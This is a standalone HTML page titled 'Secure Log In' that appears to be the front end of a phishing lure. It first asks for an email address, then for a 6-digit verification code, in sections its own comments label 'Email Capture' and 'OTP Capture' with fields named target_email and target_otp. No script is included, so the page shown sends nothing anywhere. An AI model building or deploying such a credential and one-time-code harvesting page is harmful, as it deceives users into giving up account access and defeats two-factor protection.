<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Log In</title>
    <style>
        /* Base Reset & Typography */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #1c1e21;
        }

        /* Clean Card UI */
        .login-container {
            background: #ffffff;
            padding: 40px 32px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 420px;
            box-sizing: border-box;
            text-align: center;
        }

        h2 {
            margin-top: 0;
            margin-bottom: 28px;
            font-weight: 600;
            font-size: 24px;
        }

        p.subtitle {
            color: #606770;
            font-size: 14.5px;
            margin-bottom: 24px;
            line-height: 1.5;
        }

        /* Input Fields */
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #4b4f56;
            font-size: 14px;
            font-weight: 600;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ccd0d5;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-group input:focus {
            border-color: #1877f2;
            outline: none;
            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.2);
        }

        /* Action Buttons */
        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 8px;
        }

        .submit-btn:hover {
            background-color: #166fe5;
        }

        /* Hide OTP section on initial load */
        #otp_section {
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Secure Log In</h2>

        <!-- Phase 1: Email Capture -->
        <div id="email_section">
            <p class="subtitle">Enter your email address to continue.</p>
            <div class="input-group">
                <label for="target_email">Email Address</label>
                <input type="email" id="target_email" placeholder="name@example.com" autocomplete="off" required>
            </div>
            <button type="button" id="submit_email_btn" class="submit-btn">Next</button>
        </div>

        <!-- Phase 2: OTP Capture -->
        <div id="otp_section">
            <p class="subtitle">Please enter the 6-digit verification code sent to your email.</p>
            <div class="input-group">
                <label for="target_otp">Verification Code</label>
                <input type="text" id="target_otp" placeholder="000000" autocomplete="off" maxlength="6" required>
            </div>
            <button type="button" id="submit_otp_btn" class="submit-btn">Verify & Sign In</button>
        </div>
    </div>
</body>
</html>
